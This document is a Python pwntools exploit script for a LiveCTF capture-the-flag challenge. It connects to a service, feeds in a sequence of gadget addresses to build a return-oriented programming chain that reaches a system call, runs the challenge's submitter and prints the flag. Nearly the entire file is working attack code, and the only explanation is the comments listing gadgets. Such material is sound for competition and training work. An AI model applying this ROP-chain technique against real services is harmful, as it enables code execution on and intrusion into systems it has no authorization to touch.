#!/usr/bin/env python3

from pwn import *
from time import sleep

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
io = remote(HOST, int(PORT))


# System call at 0x000000000401905
# Can load rdi then call with 0x0000000000401914


# 0x0000000000487212 : pop rax ; pop rdx ; leave ; ret
# 0x471885 <__strchr_evex+69>:	add    rax,rdi
# 0x0000000000402218 : pop rdi ; pop rbp ; ret
# 0x0000000000458349 : loopne 0x45834d ; sub eax, 1 ; ret
# 0x0000000000437486 : add eax, 0x9bc21 ; pop rbp ; ret
# 0x0000000000471884 : add al, 0x48 ; add eax, edi ; ret
# 0x0000000000471886 : add eax, edi ; ret

# io = process(BINARY)
# _ = gdb.attach(io, gdbscript=gdbscript)

def send_addr(addr):
    addr = str(addr).encode("utf-8")
    io.sendline(addr)

for i in range(4):
    io.recvuntil(b"Addr pls: ")
    send_addr(400000001)

def send_next(addr):
    io.recvuntil(b"Addr pls: ")
    send_addr(addr)

send_next(402218) # pop rdi ; pop rbp ; ret
send_next(499999) # rdi
send_next(401020) # rbp
send_next(471884) # add al, 0x48 ; add eax, edi ; ret

send_next(402218) # pop rdi ; pop rbp ; ret
send_next(6918) # rdi
send_next(401020) # rbp
send_next(471886) # add eax, edi ; ret

send_next(402218) # pop rdi ; pop rbp ; ret
send_next(200) # rdi
send_next(401020) # rbp
send_next(471886) # add eax, edi ; ret

send_next(401914)

io.recvuntil(b"Addr pls: ")
send_addr(0)

sleep(1)
io.sendline(b"./submitter")
flag = io.recvline_contains(b"LiveCTF{").decode().strip()
log.info('Flag: %s', flag)
